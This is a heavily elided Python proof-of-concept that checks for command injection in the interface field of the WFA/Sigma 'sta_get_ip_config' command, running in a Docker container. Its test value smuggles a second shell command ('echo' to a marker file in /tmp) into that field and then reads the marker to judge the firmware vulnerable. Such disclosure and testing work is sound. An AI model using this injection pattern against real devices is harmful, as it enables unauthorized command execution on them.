#!/usr/bin/env python3
"""
PoC: WFA/Sigma command injection through sta_get_ip_config interface field.
"""
...
def main():
    ...
    marker = "/tmp/wfa_inj_ipcfg"
    docker_sh(args.container, firmware_root_expr() + f'rm -f "$root{marker}"')
    command = f"sta_get_ip_config,interface,ra0;echo WFA_IPCFG>{marker};#"
    ...
    vulnerable = marker_value == "WFA_IPCFG"
